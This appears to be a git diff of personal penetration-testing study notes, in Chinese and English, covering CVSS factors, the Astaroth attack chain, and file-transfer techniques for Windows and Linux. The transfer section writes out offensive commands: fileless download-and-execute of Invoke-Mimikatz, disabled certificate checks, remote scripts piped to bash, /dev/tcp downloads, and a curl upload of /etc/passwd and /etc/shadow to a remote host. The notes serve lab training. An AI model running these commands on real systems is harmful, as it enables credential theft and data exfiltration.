@@ -564,3 +564,159 @@ gobuster vhost -u http://web1337.inlanefreight.htb:31591 -w /usr/share/seclists/
 
 whois 注册时间近期、隐藏注册者身份、名称服务器通常与已知恶意服务提供商相关联。
 
+# CVSS
+
+## 1. 5个因素
+
+### 1.1 Damage Potential
+
+### 1.2 Reproducibility
+
+### 1.3 Exploitability
+
+可利用性衡量包括访问向量、访问复杂性和身份验证。
+
+使用以下指标评估利用问题所需的技术手段的方法：
+
+攻击向量
+
+攻击复杂性
+
+所需权限
+
+用户交互
+
+### 1.4 Affected Users
+
+影响指标由CIA 三元组组成，包括机密性、完整性和可用性。
+
+**机密性影响**与保护信息和确保只有授权的个人才能访问有关，例如，高严重性值与攻击者窃取密码或加密密钥的情况有关，低严重性值与攻击者获取的信息可能不是组织的重要资产有关。
+
+**完整性影响**与未更改或篡改信息以保持准确性有关。例如，高严重性是指攻击者修改了组织环境中的关键业务文件。低严重性值是指攻击者无法专门控制已更改或修改的文件的数量。
+
+**可用性影响**与根据业务要求轻松获取信息有关。例如，如果攻击者导致环境对业务完全不可用，则该值较高。如果攻击者无法完全拒绝对业务资产的访问，并且用户仍然可以访问某些组织资产，则该值较低。
+
+### 1.5 Discoverability
+
+# 四、Astaroth attack
+
+The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).
+
+All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process.
+
+<img src="\image-20250513104915703.png" alt="image-20250513104915703" style="zoom:50%;" />
+
+# 五、文件传输
+
+## 5.1 windows文件传输
+
+### 5.1.1 powershell
+
+```
+1.md5sum id_rsa
+2.cat id_rsa | base64 -w 0;echo #-w 0的意思是只创建一行
+echo -n 'base64内容' | base64 -d > id_rsa #解码
+3.[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("xxx以上内容"))
+4.Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 #hash校验
+############################文件下载
+5.(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+6.(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+###########################无文件方法
+7.IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+8.(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+可以使用参数 -UseBasicParseing 来绕过
+9.[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+```
+
+PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. 
+
+```
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')#上传文件
+```
+
+### 5.1.2 SMB
+
+```
+impacket-smbserver share -smb2support /tmp/smbshare #创建SMB服务器
+impacket-smbserver share -smb2support /tmp/smbshare -user test -password test #创建用户密码
+copy \\x.x.x.x\share\nc.exe #从SMB服务器复制文件
+net use n: \\192.168.220.133\share /user:test test#使用用户名和密码挂载SMB服务器
+```
+
+### 5.1.3 FTP
+
+```
+pip3 install pyftpdlib #默认情况下，使用端口2121
+python3 -m pyftpdlib --port 21
+```
+
+## 5.2 linux文件传输
+
+### 5.2.1 wget
+
+```
+wget https://xxx./s -O ssx.
+```
+
+### 5.2.2 curl
+
+```
+curl https://xxx./s -o ssx.
+```
+
+### 5.2.3 使用无文件攻击
+
+利用管道，但也可能会留下临时文件
+
+```
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+### 5.2.4 使用bash下载
+
+```
+exec 3<>/dev/tcp/10.10.10.32/80 #连接到服务器
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 #HTTP GET请求
+cat <&3 #打印响应
+```
+
+### 5.2.5 SSH
+
+```
+scp plaintext@192.168.49.128:/root/myroot.txt . #下载
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/ #上传
+```
+
+上传文件到web服务器
+
+```shell-session
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+不同语言开启简单web服务器的方法
+
+python
+
+```
+python3 -m pip install --user uploadserver
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' #创建自签名证书
+python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+```
+
+php
+
+```
+php -S 0.0.0.0:8000
+```
+
+ruby
+
+```
+ruby -run -ehttpd . -p8000
+```
+
